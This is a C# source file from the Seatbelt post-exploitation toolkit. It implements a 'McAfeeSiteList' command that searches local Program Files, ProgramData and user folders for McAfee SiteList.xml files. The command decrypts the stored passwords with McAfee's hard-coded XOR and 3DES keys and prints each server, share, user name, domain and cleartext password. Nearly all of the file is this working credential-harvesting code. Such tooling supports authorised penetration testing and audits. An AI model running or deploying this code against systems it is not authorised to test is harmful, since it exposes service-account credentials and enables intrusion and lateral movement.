using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using Seatbelt.Output.TextWriters;
using Seatbelt.Output.Formatters;
using Seatbelt.Util;
using System.Security.Cryptography;

namespace Seatbelt.Commands
{
    class McAfeeSite
    {
        public McAfeeSite(string type, string name, string server, string relativePath, string shareName, string userName, string domainName, string encPassword, string decPassword)
        {
            Type = type;
            Name = name;
            Server = server;
            RelativePath = relativePath;
            ShareName = shareName;
            UserName = userName;
            DomainName = domainName;
            EncPassword = encPassword;
            DecPassword = decPassword;  
        }
        public string Type { get; set; }

        public string Name { get; set; }

        public string Server { get; set; }

        public string RelativePath { get; set; }

        public string ShareName { get; set; }

        public string UserName { get; set; }

        public string DomainName { get; set; }

        public string EncPassword { get; set; }

        public string DecPassword { get; set; }
    }


    internal class McAfeeSiteListCommand : CommandBase
    {
        public override string Command => "McAfeeSiteList";
        public override string Description => "Decrypt any found McAfee SiteList.xml configuration files.";
        public override CommandGroup[] Group => new[] { CommandGroup.Misc };
        public override bool SupportRemote => false; // TODO when remote file searching is worked out... though it might take a while

        public McAfeeSiteListCommand(Runtime runtime) : base(runtime)
        {
        }

        public static string DecryptSiteListPassword(string b64password)
        {
            // Adapted from PowerUp: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1#L4128-L4326

            // References:
            //  https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
            //  https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
            //  https://github.com/tfairane/HackStory/blob/master/McAfeePrivesc.md
            //  https://www.syss.de/fileadmin/dokumente/Publikationen/2011/SySS_2011_Deeg_Privilege_Escalation_via_Antivirus_Software.pdf

            // static McAfee key XOR key LOL
            byte[] XORKey = { 0x12, 0x15, 0x0F, 0x10, 0x11, 0x1C, 0x1A, 0x06, 0x0A, 0x1F, 0x1B, 0x18, 0x17, 0x16, 0x05, 0x19 };

            // xor the input b64 string with the static XOR key
            var passwordBytes = System.Convert.FromBase64String(b64password);
            for (var i = 0; i < passwordBytes.Length; i++)
            {
                passwordBytes[i] = (byte)(passwordBytes[i] ^ XORKey[i % XORKey.Length]);
            }

            SHA1 crypto = new SHA1CryptoServiceProvider();

            // build the static McAfee 3DES key TROLOL
            var tDESKey = MiscUtil.Combine(crypto.ComputeHash(System.Text.Encoding.ASCII.GetBytes("<!@#$%^>")), new byte[] { 0x00, 0x00, 0x00, 0x00 });

            // set the options we need
            var tDESalg = new TripleDESCryptoServiceProvider();
            tDESalg.Mode = CipherMode.ECB;
            tDESalg.Padding = PaddingMode.None;
            tDESalg.Key = tDESKey;

            // decrypt the unXor'ed block
            var decrypted = tDESalg.CreateDecryptor().TransformFinalBlock(passwordBytes, 0, passwordBytes.Length);
            var end = Array.IndexOf(decrypted, (byte)0x00);

            // return the final password string
            var password = System.Text.Encoding.ASCII.GetString(decrypted, 0, end);

            return password;
        }

        public override IEnumerable<CommandDTOBase?> Execute(string[] args)
        {
            // paths that might contain SiteList.xml files
            string[] paths = { @"C:\Program Files\", @"C:\Program Files (x86)\", @"C:\ProgramData\", @"C:\Documents and Settings\", @"C:\Users\" };
            foreach (var path in paths)
            {
                foreach (var foundFile in MiscUtil.GetFileList(@"SiteList.xml", path))
                {
                    var xmlString = File.ReadAllText(foundFile);

                    // things crash with this header, so have to remove it
                    xmlString = xmlString.Replace("<?xml version=\"1.0\" encoding=\"UTF-8\"?>", "");
                    var xmlDoc = new XmlDocument();

                    xmlDoc.LoadXml(xmlString);

                    var sites = xmlDoc.GetElementsByTagName("SiteList");

                    if (sites[0].ChildNodes.Count == 0)
                        continue;

                    var mcafeeSites = new List<McAfeeSite>();

                    foreach (XmlNode site in sites[0].ChildNodes)
                    {
                        if (site.Attributes["Name"] == null || site.Attributes["Server"] == null)
                        {
                            continue;
                        }
                        var type = site.Name;
                        var name = site.Attributes["Name"].Value;
                        var server = site.Attributes["Server"].Value;
                        var relativePath = "";
                        var shareName = "";
                        var user = "";
                        var encPassword = "";
                        var decPassword = "";
                        var domainName = "";

                        foreach (XmlElement attribute in site.ChildNodes)
                        {
                            switch (attribute.Name)
                            {
                                case "RelativePath":
                                    relativePath = attribute.InnerText;
                                    break;
                                case "ShareName":
                                    shareName = attribute.InnerText;
                                    break;
                                case "UserName":
                                    user = attribute.InnerText;
                                    break;
                                case "Password":
                                    if(MiscUtil.IsBase64String(attribute.InnerText))
                                    {
                                        encPassword = attribute.InnerText;
                                        decPassword = DecryptSiteListPassword(encPassword);
                                    }
                                    else
                                    {
                                        decPassword = attribute.InnerText;
                                    }
                                    break;
                                case "DomainName":
                                    domainName = attribute.InnerText;
                                    break;
                                default:
                                    break;
                            }
                        }

                        var config = new McAfeeSite(
                            type,
                            name,
                            server,
                            relativePath,
                            shareName,
                            user,
                            domainName,
                            encPassword,
                            decPassword
                            );

                        mcafeeSites.Add(config);
                    }

                    if (mcafeeSites.Count > 0)
                    {
                        yield return new McAfeeSiteListDTO(
                            foundFile,
                            mcafeeSites
                        );
                    }
                }

            }

            yield return null;
        }

        internal class McAfeeSiteListDTO : CommandDTOBase
        {
            public McAfeeSiteListDTO(string path, List<McAfeeSite> sites)
            {
                Path = path;
                Sites = sites;  
            }
            public string Path { get; set; }
            public List<McAfeeSite> Sites { get; set; }
        }

        [CommandOutputType(typeof(McAfeeSiteListDTO))]
        internal class McAfeeSiteListFormatter : TextFormatterBase
        {
            public McAfeeSiteListFormatter(ITextWriter writer) : base(writer)
            {
            }

            public override void FormatResult(CommandBase? command, CommandDTOBase result, bool filterResults)
            {
                var dto = (McAfeeSiteListDTO)result;

                WriteLine($"  McAfee SiteList Config ({dto.Path}):\n");

                foreach (var site in dto.Sites)
                {
                    WriteLine($"    Type            : {site.Type}");
                    WriteLine($"    Name            : {site.Name}");
                    WriteLine($"    Server          : {site.Server}");
                    WriteLine($"    RelativePath    : {site.RelativePath}");
                    WriteLine($"    ShareName       : {site.ShareName}");
                    WriteLine($"    UserName        : {site.UserName}");
                    WriteLine($"    DomainName      : {site.DomainName}");
                    WriteLine($"    EncPassword     : {site.EncPassword}");
                    WriteLine($"    DecPassword     : {site.DecPassword}\n");
                }
                WriteLine();
            }
        }
    }
}
